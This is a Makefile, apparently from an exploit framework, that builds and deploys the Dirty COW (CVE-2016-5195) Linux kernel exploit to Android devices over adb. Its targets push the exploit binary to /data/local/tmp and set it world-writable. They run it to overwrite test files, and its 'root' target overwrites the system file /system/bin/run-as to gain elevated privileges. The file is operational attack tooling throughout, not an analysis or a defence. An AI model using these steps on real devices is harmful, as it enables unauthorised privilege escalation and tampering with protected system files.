
ARCH := $(shell adb shell getprop ro.product.cpu.abi)
SDK_VERSION := $(shell adb shell getprop ro.build.version.sdk)

all: install

install: build
	mkdir -p ../../../../data/exploits/CVE-2016-5195
	cp -r libs/* ../../../../data/exploits/CVE-2016-5195

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)

push: build
	adb push libs/$(ARCH)/dirtycow /data/local/tmp/dcow
	adb shell 'chmod 777 /data/local/tmp/dcow'

pushpatch: build
	adb push libs/$(ARCH)/dirtycow_patch /data/local/tmp/dcow_patch
	adb shell 'chmod 777 /data/local/tmp/dcow_patch'

test: push
	adb push test.sh /data/local/tmp/test.sh
	adb shell 'chmod 777 /data/local/tmp/dcow'
	adb shell 'chmod 777 /data/local/tmp/test.sh'
	adb shell '/data/local/tmp/test.sh'
	adb shell '/data/local/tmp/dcow /data/local/tmp/test /data/local/tmp/test2'
	adb shell 'cat /data/local/tmp/test2'
	adb shell 'cat /data/local/tmp/test2' | xxd

testpatch: test pushpatch
	adb shell 'chmod 777 /data/local/tmp/dcow_patch'
	adb shell '/data/local/tmp/test.sh'
	adb shell '/data/local/tmp/dcow_patch /data/local/tmp/test2'
	adb shell 'cat /data/local/tmp/test2' | xxd

testrun: push
	adb push libs/$(ARCH)/run-as /data/local/tmp/run-as
	adb shell 'chmod 777 /data/local/tmp/run-as'
	adb shell '/data/local/tmp/run-as'

root: push
	adb shell 'chmod 777 /data/local/tmp/dcow'
	adb push libs/$(ARCH)/run-as /data/local/tmp/run-as
	adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as'

clean:
	rm -rf libs
	rm -rf obj

